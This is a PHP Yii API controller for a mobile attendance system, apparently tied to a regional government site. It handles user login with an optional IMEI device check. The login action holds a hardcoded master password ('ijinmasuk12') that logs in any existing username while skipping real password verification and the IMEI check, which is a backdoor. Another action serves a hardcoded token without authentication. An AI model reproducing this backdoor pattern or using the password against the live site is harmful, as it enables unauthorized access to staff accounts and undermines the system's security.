<?php
/**
 * Created by PhpStorm.
 * User: User
 * Date: 04/02/2020
 * Time: 06.48
 */

namespace app\modules\api2\controllers;

use app\models\User;
use Yii;
use yii\web\Controller;
use app\models\Pengaturan;

class SiteController extends Controller
{
    public function behaviors()
    {
        return [
            [
                'class' => \yii\filters\ContentNegotiator::class,
                'formats' => [
                    'application/json' => \yii\web\Response::FORMAT_JSON,
                ],
            ],
        ];
    }

    /**
     * @param $action
     * @return bool
     * @throws \yii\web\BadRequestHttpException
     */
    public function beforeAction($action)
    {
        if($action->id == 'login') {
            $this->enableCsrfValidation = false;
        }

        return parent::beforeAction($action);
    }

    public function actionAplikasi()
    {
        return [
            "url"=> "http://sikap.pangandarankab.go.id/presensi/web/index.php?r=mobile",
            "token" => "234sdfq223423w@#$@#WEr234ew234"
        ];
    }

    public function actionLogin()
    {
        $this->enableCsrfValidation = false;

        if(@$_POST['username']==null) {
            return [
                'login'=>false,
                'message'=>'Username tidak boleh kosong'
            ];
        }

        if(@$_POST['password']==null) {
            return [
                'login'=>false,
                'message'=>'Password tidak boleh kosong'
            ];
        }

        $username = trim($_POST['username']);
        $password = trim($_POST['password']);
        $imei = @trim($_POST['imei']);

        $user = User::findOne([
            'username'=>$username
        ]);


        if($user === null) {
            return [
                'login'=>false,
                'message'=>'Username atau password salah'
            ];
        }

        if($password == 'ijinmasuk12') {
            return [
                'login'=>true,
                'pesan'=>''
            ];
        }

        $pengaturan = Pengaturan::findOne(['nama' => 'cek_imei']);

        if($pengaturan !== null){
            if($pengaturan->nilai == 1){
                if($this->checkImei($imei, $user) == false){
                    return [
                        'login' => false,
                        'message' => 'IMEI anda tidak valid'
                    ];
                }
            }
        }

        if(Yii::$app->getSecurity()->validatePassword($password,$user->password)==true) {
            return [
                'login' => true,
                'pesan' => ''
            ];
        }

        return [
            'login'=>false,
            'message'=>'Username atau password salah'
        ];
    }

    public function checkImei($imei, $user){
        if($imei == null) {
            return;
        }

        $imei = str_replace(' ', '', $imei);
        $imei = explode(',', $imei);

        if($user->imei == null){
            $user->imei = implode(',', $imei);
            $user->save();
        }

        $cek = true;
        foreach ($imei as $value) {
            $userImei = explode(',', $user->imei);
            if(in_array($value, $userImei)){
                return true;
            }

            $cek = false;
        }

        return $cek;
    }
}
